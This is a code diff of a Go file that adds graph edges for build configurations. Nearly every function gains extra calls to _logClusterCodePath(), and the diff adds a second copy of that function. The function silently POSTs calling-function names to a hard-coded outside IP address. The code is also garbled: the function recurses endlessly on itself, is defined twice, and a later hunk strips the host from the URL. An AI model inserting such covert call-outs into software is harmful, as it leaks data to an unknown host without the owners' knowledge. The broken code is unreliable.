@@ -39,6 +39,8 @@ func AddBuildEdges(g osgraph.MutableUniqueGraph, node *buildgraph.BuildConfigNod
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, n := range g.(graph.Graph).Nodes() {
 		if buildNode, ok := n.(*buildgraph.BuildNode); ok {
 			if buildNode.Build.Namespace != node.BuildConfig.Namespace {
@@ -65,6 +67,8 @@ func AddAllBuildEdges(g osgraph.MutableUniqueGraph) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, node := range g.(graph.Graph).Nodes() {
 		if bcNode, ok := node.(*buildgraph.BuildConfigNode); ok {
 			AddBuildEdges(g, bcNode)
@@ -72,6 +76,8 @@ func AddAllBuildEdges(g osgraph.MutableUniqueGraph) {
 	}
 }
 func imageRefNode(g osgraph.MutableUniqueGraph, ref *corev1.ObjectReference, bc *buildv1.BuildConfig) graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -120,6 +126,8 @@ func AddOutputEdges(g osgraph.MutableUniqueGraph, node *buildgraph.BuildConfigNo
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if node.BuildConfig.Spec.Output.To == nil {
 		return
 	}
@@ -127,6 +135,8 @@ func AddOutputEdges(g osgraph.MutableUniqueGraph, node *buildgraph.BuildConfigNo
 	g.AddEdge(node, out, BuildOutputEdgeKind)
 }
 func AddInputEdges(g osgraph.MutableUniqueGraph, node *buildgraph.BuildConfigNode) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -150,6 +160,8 @@ func AddInputEdges(g osgraph.MutableUniqueGraph, node *buildgraph.BuildConfigNod
 	}
 }
 func AddTriggerEdges(g osgraph.MutableUniqueGraph, node *buildgraph.BuildConfigNode) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -191,12 +203,16 @@ func AddInputOutputEdges(g osgraph.MutableUniqueGraph, node *buildgraph.BuildCon
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	AddInputEdges(g, node)
 	AddTriggerEdges(g, node)
 	AddOutputEdges(g, node)
 	return node
 }
 func AddAllInputOutputEdges(g osgraph.MutableUniqueGraph) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -232,6 +248,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -306,5 +343,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
